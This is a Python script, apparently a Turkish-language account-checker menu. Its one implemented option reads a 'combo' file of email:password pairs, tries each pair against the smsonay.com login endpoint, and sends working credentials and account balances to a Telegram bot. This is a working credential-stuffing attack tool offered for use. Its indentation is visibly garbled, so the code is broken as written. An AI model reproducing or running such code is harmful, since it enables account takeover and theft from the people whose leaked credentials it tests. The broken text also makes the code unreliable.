import requests
import os
from cfonts import render       


Z = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
C = '\x1b[1;97m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
C = '\x1b[1;97m'
y = '\x1b[1;35m'
f = '\x1b[2;35m'
z = '\x1b[3;33m'
G = '\x1b[2;36m'
E = '\x1b[1;31m'
DS = '\x1b[30m'
V = '\x1b[1;35m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
Z1 = '\x1b[2;31m'
F = '\x1b[2;32m'
A = '\x1b[2;34m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
Y = '\x1b[1;34m'
M = '\x1b[1;37m'
S = '\x1b[1;33m'
U = '\x1b[1;37m'
Z = '\x1b[1;31m'
X = '\x1b[1;33m'
F = '\x1b[2;32m'
O = '\x1b[38;5;208m'
BL = '\x1b[38;5;21m'
YU = '\x1b[38;5;200m'

print("\x1b[1;39m—" * 60)
logo = render('THOMAS', colors=['green', 'white'], align='center', line_height=0)
print(logo)  
print("\x1b[1;39m—" * 60)

print("\x1b[38;5;117m  1\x1b[38;5;231m - TV Plus Checker | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  2\x1b[38;5;231m - Blu TV Checker  | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  3\x1b[38;5;231m - Exxen Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  4\x1b[38;5;231m - Beymen Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  5\x1b[38;5;231m - Tiktok Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  6\x1b[38;5;231m - Bilyoner Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  7\x1b[38;5;231m - Hotmail Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  8\x1b[38;5;231m - Disney Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  9\x1b[38;5;231m - Sms Onay Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  10\x1b[38;5;231m - D - Smart  Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  11\x1b[38;5;231m - Facebook Checker   | \x1b[1;32m aktif ✅")
print("\x1b[38;5;117m  12\x1b[38;5;231m - Instagram Checker   | \x1b[1;32m aktif ✅")



pss = input (Y+'hangi işlemi yapmak istiyorsunuz :  ')
os.system('clear')
print(G)


if pss in '1':
	import requests
    import os
    s = '\033[33m'
    o = '\033[35m'
    r = '\033[32m'
    y = '\033[31m'
    print(f'{s}Dev: @SoryCoder')
    sory = input(f'{o}Combo Yolu Gir: ')
    os.system('clear')
    print(f'{s}Dev: @SoryCoder')
    token = input(f'{o}Token Gir: ')
    os.system('clear')
    print(f'{s}Dev: @SoryCoder')
    ID = input(f'{o}İd Gir: ')

    def sorii(email, password):
        url = "https://www.smsonay.com/ajax/login"
            soryders = {
                    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
                            'x-requested-with': "XMLHttpRequest",
                                }
                                    soribaba = {
                                            'email': email,
                                                    'password': password,
                                                        }
                                                            response = requests.post(url, data=soribaba, headers=soryders)

                                                                try:
                                                                        result = response.json()
                                                                                if result.get('success'):
                                                                                            bakiye = result.get('bakiye', 'unknown')
                                                                                                        print(f'{r}Giriş Başarılı: {email}:{password} Bakiye: {bakiye}\n@SoryCoder')
                                                                                                                    soryi = f"""
                                                                                                                    ════════════════
                                                                                                                    Mail: {email}
                                                                                                                    Şifre: {password}
                                                                                                                    Bakiye: {bakiye}
                                                                                                                    ═════════════════
                                                                                                                    By • @SoryCoder"""
                                                                                                                                requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={soryi}')
                                                                                                                                        else:
                                                                                                                                                    print(f'{y}Giriş Başarısız: {email} : {password}\n@SoryCoder')

                                                                                                                                                        except ValueError:
                                                                                                                                                                print(f'Hata: Geçersiz yanıt alındı: {response.text}')

                                                                                                                                                                try:
                                                                                                                                                                    with open(sory, 'r') as dosya:
                                                                                                                                                                            for satir in dosya:
                                                                                                                                                                                        parts = satir.strip().split(':')
                                                                                                                                                                                                    if len(parts) == 2:
                                                                                                                                                                                                                    email, password = parts
                                                                                                                                                                                                                                    sorii(email, password)
                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                print(f'Hatalı format: {satir.strip()}')
                                                                                                                                                                                                                                                                except FileNotFoundError:
                                                                                                                                                                                                                                                                    print('Combo bulunamadı')
                                                                                                                                                                                                                                                                    